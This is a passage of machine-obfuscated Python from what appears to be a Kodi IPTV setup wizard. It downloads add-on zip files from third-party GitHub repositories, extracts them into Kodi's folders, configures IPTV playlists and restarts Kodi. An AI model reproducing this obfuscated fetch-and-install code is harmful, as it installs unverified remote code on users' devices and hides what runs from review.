                        OO0O00000OOOOOOOO =(OO0O0OO0O0OOOOO0O -OOOO00OO0000OO0O0 )/OOOO00OOOO0OO0OO0 #line:5957
                    else :#line:5958
                        OO0O00000OOOOOOOO =0 #line:5959
                    OO00O0OOO000O0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO00OOOO0OO0OO0 ,OOO00OO0OO00O0O0O )#line:5960
                    O000OOO0O00000O00 .update (int (O00OOOOOO0O0OO0O0 ),"Downloading "+'iptv',OO00O00O0O000000O ,OO00O0OOO000O0O00 )#line:5962
              OO0000O00O00O0O0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5965
              O0000OOOO0O00OO0O .close ()#line:5968
              extract .all (O0OOO00O0O000OO00 ,OO0000O00O00O0O0O ,O000OOO0O00000O00 )#line:5969
              try :#line:5972
                os .remove (O0OOO00O0O000OO00 )#line:5973
              except :#line:5975
                pass #line:5976
              O000OOO0O00000O00 .close ()#line:5977
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5980
              O00O000O0000O0O0O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5982
              O00O0OOO0OO0OOO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5983
              O0OO0O0O0O0O0O0O0 =xbmcgui .DialogProgress ()#line:5984
              O0OO0O0O0O0O0O0O0 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5985
              O0OOO00O0O000OO00 =os .path .join (O00O0OOO0OO0OOO00 ,'isr.zip')#line:5986
              OOO0OO00O00OO0000 =urllib2 .Request (O00O000O0000O0O0O )#line:5987
              OOOO0OO0O0OO00OOO =urllib2 .urlopen (OOO0OO00O00OO0000 )#line:5988
              O000OOO0O00000O00 =xbmcgui .DialogProgress ()#line:5990
              O000OOO0O00000O00 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5991
              O000OOO0O00000O00 .update (0 )#line:5992
              O0000OOOO0O00OO0O =open (O0OOO00O0O000OO00 ,'wb')#line:5994
              try :#line:5996
                OO0O0OO0O0OOOOO0O =OOOO0OO0O0OO00OOO .info ().getheader ('Content-Length').strip ()#line:5997
                O0000O0O0OOOO0000 =True #line:5998
              except AttributeError :#line:5999
                    O0000O0O0OOOO0000 =False #line:6000
              if O0000O0O0OOOO0000 :#line:6002
                    OO0O0OO0O0OOOOO0O =int (OO0O0OO0O0OOOOO0O )#line:6003
              OOOO00OO0000OO0O0 =0 #line:6005
              O0O000OOOO00O0O0O =time .time ()#line:6006
              while True :#line:6007
                    O0O0000000O00OO0O =OOOO0OO0O0OO00OOO .read (8192 )#line:6008
                    if not O0O0000000O00OO0O :#line:6009
                        sys .stdout .write ('\n')#line:6010
                        break #line:6011
                    OOOO00OO0000OO0O0 +=len (O0O0000000O00OO0O )#line:6013
                    O0000OOOO0O00OO0O .write (O0O0000000O00OO0O )#line:6014
                    if not O0000O0O0OOOO0000 :#line:6016
                        OO0O0OO0O0OOOOO0O =OOOO00OO0000OO0O0 #line:6017
                    if O000OOO0O00000O00 .iscanceled ():#line:6018
                       O000OOO0O00000O00 .close ()#line:6019
                       try :#line:6020
                        os .remove (O0OOO00O0O000OO00 )#line:6021
                       except :#line:6022
                        pass #line:6023
                       break #line:6024
                    O00OOOOOO0O0OO0O0 =float (OOOO00OO0000OO0O0 )/OO0O0OO0O0OOOOO0O #line:6025
                    O00OOOOOO0O0OO0O0 =round (O00OOOOOO0O0OO0O0 *100 ,2 )#line:6026
                    O0000OO0OO000OO00 =OOOO00OO0000OO0O0 /(1024 *1024 )#line:6027
                    O0OO0000OO0000000 =OO0O0OO0O0OOOOO0O /(1024 *1024 )#line:6028
                    OO00O00O0O000000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0000OO0OO000OO00 ,'teal',O0OO0000OO0000000 )#line:6029
                    if (time .time ()-O0O000OOOO00O0O0O )>0 :#line:6030
                      OOOO00OOOO0OO0OO0 =OOOO00OO0000OO0O0 /(time .time ()-O0O000OOOO00O0O0O )#line:6031
                      OOOO00OOOO0OO0OO0 =OOOO00OOOO0OO0OO0 /1024 #line:6032
                    else :#line:6033
                     OOOO00OOOO0OO0OO0 =0 #line:6034
                    OOO00OO0OO00O0O0O ='KB'#line:6035
                    if OOOO00OOOO0OO0OO0 >=1024 :#line:6036
                       OOOO00OOOO0OO0OO0 =OOOO00OOOO0OO0OO0 /1024 #line:6037
                       OOO00OO0OO00O0O0O ='MB'#line:6038
                    if OOOO00OOOO0OO0OO0 >0 and not O00OOOOOO0O0OO0O0 ==100 :#line:6039
                        OO0O00000OOOOOOOO =(OO0O0OO0O0OOOOO0O -OOOO00OO0000OO0O0 )/OOOO00OOOO0OO0OO0 #line:6040
                    else :#line:6041
                        OO0O00000OOOOOOOO =0 #line:6042
                    OO00O0OOO000O0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO00OOOO0OO0OO0 ,OOO00OO0OO00O0O0O )#line:6043
                    O000OOO0O00000O00 .update (int (O00OOOOOO0O0OO0O0 ),"Downloading "+'iptv',OO00O00O0O000000O ,OO00O0OOO000O0O00 )#line:6045
              OO0000O00O00O0O0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6048
              O0000OOOO0O00OO0O .close ()#line:6051
              extract .all (O0OOO00O0O000OO00 ,OO0000O00O00O0O0O ,O000OOO0O00000O00 )#line:6052
              try :#line:6053
                os .remove (O0OOO00O0O000OO00 )#line:6054
              except :#line:6056
                pass #line:6057
              O000OOO0O00000O00 .close ()#line:6058
def iptvkodi17_18 ():#line:6059
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:6062
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6063
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6064
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:6068
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6069
              OO0OOOOOO0O00O0OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:6071
              OOOOOO000O00OOOOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6072
              OOOO0000000OOOOOO =xbmcgui .DialogProgress ()#line:6073
              OOOO0000000OOOOOO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6074
              OO00O000OO000O0O0 =os .path .join (OOOOOO000O00OOOOO ,'isr.zip')#line:6075
              O0OO0O00000OOO0O0 =urllib2 .Request (OO0OOOOOO0O00O0OO )#line:6076
              O0O00O00O0O000OOO =urllib2 .urlopen (O0OO0O00000OOO0O0 )#line:6077
              OO00OOO0000O0OO00 =xbmcgui .DialogProgress ()#line:6079
              OO00OOO0000O0OO00 .create ("Downloading","Downloading "+'iptv')#line:6080
              OO00OOO0000O0OO00 .update (0 )#line:6081
              OOO000OO00O000OO0 =open (OO00O000OO000O0O0 ,'wb')#line:6083
              try :#line:6085
                OO0OO0000OOO00O0O =O0O00O00O0O000OOO .info ().getheader ('Content-Length').strip ()#line:6086
                OO00OOOO000OOO0O0 =True #line:6087
              except AttributeError :#line:6088
                    OO00OOOO000OOO0O0 =False #line:6089
              if OO00OOOO000OOO0O0 :#line:6091
                    OO0OO0000OOO00O0O =int (OO0OO0000OOO00O0O )#line:6092
              O0OO0O000O00OO0OO =0 #line:6094
              O0OOO0O000OOOOO00 =time .time ()#line:6095
              while True :#line:6096
                    OOOO0OOOO0000OOOO =O0O00O00O0O000OOO .read (8192 )#line:6097
                    if not OOOO0OOOO0000OOOO :#line:6098
                        sys .stdout .write ('\n')#line:6099
                        break #line:6100
                    O0OO0O000O00OO0OO +=len (OOOO0OOOO0000OOOO )#line:6102
                    OOO000OO00O000OO0 .write (OOOO0OOOO0000OOOO )#line:6103
                    if not OO00OOOO000OOO0O0 :#line:6105
                        OO0OO0000OOO00O0O =O0OO0O000O00OO0OO #line:6106
                    if OO00OOO0000O0OO00 .iscanceled ():#line:6107
                       OO00OOO0000O0OO00 .close ()#line:6108
                       try :#line:6109
                        os .remove (OO00O000OO000O0O0 )#line:6110
                       except :#line:6111
                        pass #line:6112
                       break #line:6113
                    O00O0O0OOO0OO000O =float (O0OO0O000O00OO0OO )/OO0OO0000OOO00O0O #line:6114
                    O00O0O0OOO0OO000O =round (O00O0O0OOO0OO000O *100 ,2 )#line:6115
                    O0OOOO00000OOO0OO =O0OO0O000O00OO0OO /(1024 *1024 )#line:6116
                    O0OO00O000OOOOO00 =OO0OO0000OOO00O0O /(1024 *1024 )#line:6117
                    OO0OO0000OOOO0O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOO00000OOO0OO ,'teal',O0OO00O000OOOOO00 )#line:6118
                    if (time .time ()-O0OOO0O000OOOOO00 )>0 :#line:6119
                      O0OOOO0OO00O0OOO0 =O0OO0O000O00OO0OO /(time .time ()-O0OOO0O000OOOOO00 )#line:6120
                      O0OOOO0OO00O0OOO0 =O0OOOO0OO00O0OOO0 /1024 #line:6121
                    else :#line:6122
                     O0OOOO0OO00O0OOO0 =0 #line:6123
                    OOO000O0OO00OO000 ='KB'#line:6124
                    if O0OOOO0OO00O0OOO0 >=1024 :#line:6125
                       O0OOOO0OO00O0OOO0 =O0OOOO0OO00O0OOO0 /1024 #line:6126
                       OOO000O0OO00OO000 ='MB'#line:6127
                    if O0OOOO0OO00O0OOO0 >0 and not O00O0O0OOO0OO000O ==100 :#line:6128
                        OOOO0O000O00O0OOO =(OO0OO0000OOO00O0O -O0OO0O000O00OO0OO )/O0OOOO0OO00O0OOO0 #line:6129
                    else :#line:6130
                        OOOO0O000O00O0OOO =0 #line:6131
                    O0OO0OOO0O0OO0OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOO0OO00O0OOO0 ,OOO000O0OO00OO000 )#line:6132
                    OO00OOO0000O0OO00 .update (int (O00O0O0OOO0OO000O ),"Downloading "+'iptv',OO0OO0000OOOO0O0O ,O0OO0OOO0O0OO0OO0 )#line:6134
              OOOO0O00OO00000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6137
              OOO000OO00O000OO0 .close ()#line:6140
              extract .all (OO00O000OO000O0O0 ,OOOO0O00OO00000O0 ,OO00OOO0000O0OO00 )#line:6141
              wiz .kodi17Fix ()#line:6143
              try :#line:6145
                os .remove (OO00O000OO000O0O0 )#line:6146
              except :#line:6148
                pass #line:6149
              OO00OOO0000O0OO00 .close ()#line:6150
              xbmc .sleep (5000 )#line:6152
              OOO0OOOO00OO0O000 ='התקנת לקוח טלוויזיה חיה'#line:6154
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOOO00OO0O000 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6155
              resetkodi ()#line:6156
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6157
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:6158
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6159
              OO0OOOOOO0O00O0OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:6160
              OOOOOO000O00OOOOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6161
              OOOO0000000OOOOOO =xbmcgui .DialogProgress ()#line:6162
              OOOO0000000OOOOOO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6163
              OO00O000OO000O0O0 =os .path .join (OOOOOO000O00OOOOO ,'isr.zip')#line:6164
              O0OO0O00000OOO0O0 =urllib2 .Request (OO0OOOOOO0O00O0OO )#line:6165
              O0O00O00O0O000OOO =urllib2 .urlopen (O0OO0O00000OOO0O0 )#line:6166
              OO00OOO0000O0OO00 =xbmcgui .DialogProgress ()#line:6168
              OO00OOO0000O0OO00 .create ("Downloading","Downloading "+'iptv')#line:6169
              OO00OOO0000O0OO00 .update (0 )#line:6170
              OOO000OO00O000OO0 =open (OO00O000OO000O0O0 ,'wb')#line:6172
              try :#line:6174
                OO0OO0000OOO00O0O =O0O00O00O0O000OOO .info ().getheader ('Content-Length').strip ()#line:6175
                OO00OOOO000OOO0O0 =True #line:6176
              except AttributeError :#line:6177
                    OO00OOOO000OOO0O0 =False #line:6178
              if OO00OOOO000OOO0O0 :#line:6180
                    OO0OO0000OOO00O0O =int (OO0OO0000OOO00O0O )#line:6181
              O0OO0O000O00OO0OO =0 #line:6183
              O0OOO0O000OOOOO00 =time .time ()#line:6184
              while True :#line:6185
                    OOOO0OOOO0000OOOO =O0O00O00O0O000OOO .read (8192 )#line:6186
                    if not OOOO0OOOO0000OOOO :#line:6187
                        sys .stdout .write ('\n')#line:6188
                        break #line:6189
                    O0OO0O000O00OO0OO +=len (OOOO0OOOO0000OOOO )#line:6191
                    OOO000OO00O000OO0 .write (OOOO0OOOO0000OOOO )#line:6192
                    if not OO00OOOO000OOO0O0 :#line:6194
                        OO0OO0000OOO00O0O =O0OO0O000O00OO0OO #line:6195
                    if OO00OOO0000O0OO00 .iscanceled ():#line:6196
                       OO00OOO0000O0OO00 .close ()#line:6197
                       try :#line:6198
                        os .remove (OO00O000OO000O0O0 )#line:6199
                       except :#line:6200
                        pass #line:6201
                       break #line:6202
                    O00O0O0OOO0OO000O =float (O0OO0O000O00OO0OO )/OO0OO0000OOO00O0O #line:6203
                    O00O0O0OOO0OO000O =round (O00O0O0OOO0OO000O *100 ,2 )#line:6204
                    O0OOOO00000OOO0OO =O0OO0O000O00OO0OO /(1024 *1024 )#line:6205
                    O0OO00O000OOOOO00 =OO0OO0000OOO00O0O /(1024 *1024 )#line:6206
                    OO0OO0000OOOO0O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOO00000OOO0OO ,'teal',O0OO00O000OOOOO00 )#line:6207
                    if (time .time ()-O0OOO0O000OOOOO00 )>0 :#line:6208
                      O0OOOO0OO00O0OOO0 =O0OO0O000O00OO0OO /(time .time ()-O0OOO0O000OOOOO00 )#line:6209
                      O0OOOO0OO00O0OOO0 =O0OOOO0OO00O0OOO0 /1024 #line:6210
                    else :#line:6211
                     O0OOOO0OO00O0OOO0 =0 #line:6212
                    OOO000O0OO00OO000 ='KB'#line:6213
                    if O0OOOO0OO00O0OOO0 >=1024 :#line:6214
                       O0OOOO0OO00O0OOO0 =O0OOOO0OO00O0OOO0 /1024 #line:6215
                       OOO000O0OO00OO000 ='MB'#line:6216
                    if O0OOOO0OO00O0OOO0 >0 and not O00O0O0OOO0OO000O ==100 :#line:6217
                        OOOO0O000O00O0OOO =(OO0OO0000OOO00O0O -O0OO0O000O00OO0OO )/O0OOOO0OO00O0OOO0 #line:6218
                    else :#line:6219
                        OOOO0O000O00O0OOO =0 #line:6220
                    O0OO0OOO0O0OO0OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOO0OO00O0OOO0 ,OOO000O0OO00OO000 )#line:6221
                    OO00OOO0000O0OO00 .update (int (O00O0O0OOO0OO000O ),"Downloading "+'iptv',OO0OO0000OOOO0O0O ,O0OO0OOO0O0OO0OO0 )#line:6223
              OOOO0O00OO00000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6226
              OOO000OO00O000OO0 .close ()#line:6229
              extract .all (OO00O000OO000O0O0 ,OOOO0O00OO00000O0 ,OO00OOO0000O0OO00 )#line:6230
              wiz .kodi17Fix ()#line:6231
              try :#line:6233
                os .remove (OO00O000OO000O0O0 )#line:6234
              except :#line:6236
                pass #line:6237
              OO00OOO0000O0OO00 .close ()#line:6238
              xbmc .sleep (5000 )#line:6240
              OOO0OOOO00OO0O000 ='התקנת לקוח טלוויזיה חיה'#line:6242
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOOO00OO0O000 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6243
              resetkodi ()#line:6244
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6246
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:6247
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6248
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6249
def iptvidanplus ():#line:6250
    O0000OO0OOOO0O000 =xbmcaddon .Addon ('plugin.video.idanplus')#line:6251
    O0000OO0OOOO0O000 .setSetting ('useIPTV','true')#line:6252
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:6253
    if KODIV >=17 and KODIV <18 :#line:6256
        O000OO0OO0OO0O000 ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:6258
        O0O000000OOO0O0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6259
        OO000000OOO0O0O0O =xbmcgui .DialogProgress ()#line:6260
        OO000000OOO0O0O0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6261
        O0OOO00O000OOO0O0 =os .path .join (PACKAGES ,'isr.zip')#line:6262
        OO00OOO00O00000OO =urllib2 .Request (O000OO0OO0OO0O000 )#line:6263
        O0O00O00O0OO0O0OO =urllib2 .urlopen (OO00OOO00O00000OO )#line:6264
        OO0O0000O00O0000O =xbmcgui .DialogProgress ()#line:6266
        OO0O0000O00O0000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6267
        OO0O0000O00O0000O .update (0 )#line:6268
        O000O000OOOO0OOOO =open (O0OOO00O000OOO0O0 ,'wb')#line:6270
        try :#line:6272
          OOO0OO00OOOOO0OO0 =O0O00O00O0OO0O0OO .info ().getheader ('Content-Length').strip ()#line:6273
          OOOO0OOOOOOO0000O =True #line:6274
        except AttributeError :#line:6275
              OOOO0OOOOOOO0000O =False #line:6276
        if OOOO0OOOOOOO0000O :#line:6278
              OOO0OO00OOOOO0OO0 =int (OOO0OO00OOOOO0OO0 )#line:6279
        O0OOOOOOO0OOO0OO0 =0 #line:6281
        OOO000OOOOO0O00OO =time .time ()#line:6282
        while True :#line:6283
              OOO0OOO0O00OO0OOO =O0O00O00O0OO0O0OO .read (8192 )#line:6284
              if not OOO0OOO0O00OO0OOO :#line:6285
                  sys .stdout .write ('\n')#line:6286
                  break #line:6287
              O0OOOOOOO0OOO0OO0 +=len (OOO0OOO0O00OO0OOO )#line:6289
              O000O000OOOO0OOOO .write (OOO0OOO0O00OO0OOO )#line:6290
              if not OOOO0OOOOOOO0000O :#line:6292
                  OOO0OO00OOOOO0OO0 =O0OOOOOOO0OOO0OO0 #line:6293
              if OO0O0000O00O0000O .iscanceled ():#line:6294
                 OO0O0000O00O0000O .close ()#line:6295
                 try :#line:6296
                  os .remove (O0OOO00O000OOO0O0 )#line:6297
                 except :#line:6298
                  pass #line:6299
                 break #line:6300
              O000OO00OOOO0O0O0 =float (O0OOOOOOO0OOO0OO0 )/OOO0OO00OOOOO0OO0 #line:6301
              O000OO00OOOO0O0O0 =round (O000OO00OOOO0O0O0 *100 ,2 )#line:6302
              O0OOOOO000OOOOO00 =O0OOOOOOO0OOO0OO0 /(1024 *1024 )#line:6303
              O0OO000O00OOO00O0 =OOO0OO00OOOOO0OO0 /(1024 *1024 )#line:6304
              O00O00O00000OOOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOOO000OOOOO00 ,'teal',O0OO000O00OOO00O0 )#line:6305
              if (time .time ()-OOO000OOOOO0O00OO )>0 :#line:6306
                OO000OOO00O0OO0OO =O0OOOOOOO0OOO0OO0 /(time .time ()-OOO000OOOOO0O00OO )#line:6307
                OO000OOO00O0OO0OO =OO000OOO00O0OO0OO /1024 #line:6308
              else :#line:6309
               OO000OOO00O0OO0OO =0 #line:6310
              O000000O00000O00O ='KB'#line:6311
              if OO000OOO00O0OO0OO >=1024 :#line:6312
                 OO000OOO00O0OO0OO =OO000OOO00O0OO0OO /1024 #line:6313
                 O000000O00000O00O ='MB'#line:6314
              if OO000OOO00O0OO0OO >0 and not O000OO00OOOO0O0O0 ==100 :#line:6315
                  OOOOO00OOO0000OO0 =(OOO0OO00OOOOO0OO0 -O0OOOOOOO0OOO0OO0 )/OO000OOO00O0OO0OO #line:6316
              else :#line:6317
                  OOOOO00OOO0000OO0 =0 #line:6318
              OOO0O0OO0OO0OO0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000OOO00O0OO0OO ,O000000O00000O00O )#line:6319
              OO0O0000O00O0000O .update (int (O000OO00OOOO0O0O0 ),O00O00O00000OOOOO ,OOO0O0OO0OO0OO0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6321
        OO0O0O00O0O0O0OO0 =xbmc .translatePath (os .path .join ('special://home/'))#line:6324
        O000O000OOOO0OOOO .close ()#line:6327
        extract .all (O0OOO00O000OOO0O0 ,OO0O0O00O0O0O0OO0 ,OO0O0000O00O0000O )#line:6328
        try :#line:6332
          os .remove (O0OOO00O000OOO0O0 )#line:6333
        except :#line:6334
          pass #line:6335
        wiz .kodi17Fix ()#line:6336
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6337
        time .sleep (10 )#line:6338
        OO000O0OOOO0O0O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:6339
        OO000O0OOOO0O0O0O .setSetting ('epgTimeShift','1.000000')#line:6340
        OO000O0OOOO0O0O0O .setSetting ('m3uPathType','0')#line:6341
        OO000O0OOOO0O0O0O .setSetting ('epgPathType','0')#line:6342
        OO000O0OOOO0O0O0O .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6343
        OO000O0OOOO0O0O0O .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:6344
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:6345
        resetkodi ()#line:6346
    if KODIV >=18 :#line:6349
        iptvkodi18idan ()#line:6351
        wiz .kodi17Fix ()#line:6352
        time .sleep (10 )#line:6354
        OO000O0OOOO0O0O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:6355
        OO000O0OOOO0O0O0O .setSetting ('epgTimeShift','1.000000')#line:6356
        OO000O0OOOO0O0O0O .setSetting ('m3uPathType','0')#line:6357
        OO000O0OOOO0O0O0O .setSetting ('epgPathType','0')#line:6358
        OO000O0OOOO0O0O0O .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6359
        OO000O0OOOO0O0O0O .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:6360
        OO0000O0O0OOO0OO0 ='הגדרת ערוצי עידן פלוס'#line:6361
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0000O0O0OOO0OO0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6362
        resetkodi ()#line:6363
def iptvsimpldown ():#line:6379
    OO0OO0O0O0OOO00OO =(IPTV18 )#line:6381
    OO0OO0000OO0OO00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6382
    O000000O0OO0O00OO =xbmcgui .DialogProgress ()#line:6383
    O000000O0OO0O00OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6384
    OO00OO0OO0O0O0OOO =os .path .join (PACKAGES ,'isr.zip')#line:6385
    OO0O0O00OOOOOOOOO =urllib2 .Request (OO0OO0O0O0OOO00OO )#line:6386
    OOOOOOOOO0O000O00 =urllib2 .urlopen (OO0O0O00OOOOOOOOO )#line:6387
    OO0OOO000O0O00000 =xbmcgui .DialogProgress ()#line:6389
    OO0OOO000O0O00000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6390
    OO0OOO000O0O00000 .update (0 )#line:6391
    O00O000O000000OOO =open (OO00OO0OO0O0O0OOO ,'wb')#line:6393
    try :#line:6395
      O00O00OO0OO00000O =OOOOOOOOO0O000O00 .info ().getheader ('Content-Length').strip ()#line:6396
      O000OOO00OO0O0000 =True #line:6397
    except AttributeError :#line:6398
          O000OOO00OO0O0000 =False #line:6399
    if O000OOO00OO0O0000 :#line:6401
          O00O00OO0OO00000O =int (O00O00OO0OO00000O )#line:6402
    OO0OOO00OO0O00O0O =0 #line:6404
    O000O000000O0O0O0 =time .time ()#line:6405
    while True :#line:6406
          OO00OOOOOO0000O0O =OOOOOOOOO0O000O00 .read (8192 )#line:6407
          if not OO00OOOOOO0000O0O :#line:6408
              sys .stdout .write ('\n')#line:6409
              break #line:6410
          OO0OOO00OO0O00O0O +=len (OO00OOOOOO0000O0O )#line:6412
          O00O000O000000OOO .write (OO00OOOOOO0000O0O )#line:6413
          if not O000OOO00OO0O0000 :#line:6415
              O00O00OO0OO00000O =OO0OOO00OO0O00O0O #line:6416
          if OO0OOO000O0O00000 .iscanceled ():#line:6417
             OO0OOO000O0O00000 .close ()#line:6418
             try :#line:6419
              os .remove (OO00OO0OO0O0O0OOO )#line:6420
             except :#line:6421
              pass #line:6422
             break #line:6423
          OOO0OO0000000O00O =float (OO0OOO00OO0O00O0O )/O00O00OO0OO00000O #line:6424
          OOO0OO0000000O00O =round (OOO0OO0000000O00O *100 ,2 )#line:6425
          OO0OO000OOO0O0OO0 =OO0OOO00OO0O00O0O /(1024 *1024 )#line:6426
          O0O00O0000O000OO0 =O00O00OO0OO00000O /(1024 *1024 )#line:6427
          OOO0OOOO0O0O0OOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OO000OOO0O0OO0 ,'teal',O0O00O0000O000OO0 )#line:6428
          if (time .time ()-O000O000000O0O0O0 )>0 :#line:6429
            O00000O0000O00OOO =OO0OOO00OO0O00O0O /(time .time ()-O000O000000O0O0O0 )#line:6430
            O00000O0000O00OOO =O00000O0000O00OOO /1024 #line:6431
          else :#line:6432
           O00000O0000O00OOO =0 #line:6433
          OO00OO0O0O00OO000 ='KB'#line:6434
          if O00000O0000O00OOO >=1024 :#line:6435
             O00000O0000O00OOO =O00000O0000O00OOO /1024 #line:6436
             OO00OO0O0O00OO000 ='MB'#line:6437
          if O00000O0000O00OOO >0 and not OOO0OO0000000O00O ==100 :#line:6438
              O00OOOOO0O0O0OOO0 =(O00O00OO0OO00000O -OO0OOO00OO0O00O0O )/O00000O0000O00OOO #line:6439
          else :#line:6440
              O00OOOOO0O0O0OOO0 =0 #line:6441
          O00OOO0O00OO00000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00000O0000O00OOO ,OO00OO0O0O00OO000 )#line:6442
          OO0OOO000O0O00000 .update (int (OOO0OO0000000O00O ),OOO0OOOO0O0O0OOOO ,O00OOO0O00OO00000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6444
    O0OO0OO0OO000O0OO =xbmc .translatePath (os .path .join ('special://home/'))#line:6447
    O00O000O000000OOO .close ()#line:6450
    extract .all (OO00OO0OO0O0O0OOO ,O0OO0OO0OO000O0OO ,OO0OOO000O0O00000 )#line:6451
    try :#line:6455
      os .remove (OO00OO0OO0O0O0OOO )#line:6456
    except :#line:6457
      pass #line:6458
def telemedia_android5fix ():#line:6459
    O0O00O000000OOOOO =ADDON .getSetting ('systemtype')#line:6460
    O0O0O0000OOOO0OO0 =ADDON .getSetting ('teleandro')#line:6461
    if xbmc .getCondVisibility ('system.platform.android')and 'Android 5'in O0O00O000000OOOOO or O0O0O0000OOOO0OO0 =='true':#line:6462
        O00OOOOO0000OOO0O ='https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'#line:6464
        OO00000000OO0O000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6465
        OO0000OOO000OOO00 =xbmcgui .DialogProgress ()#line:6466
        OO0000OOO000OOO00 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6467
        OOO0O0OO00O00OOOO =os .path .join (PACKAGES ,'isr.zip')#line:6468
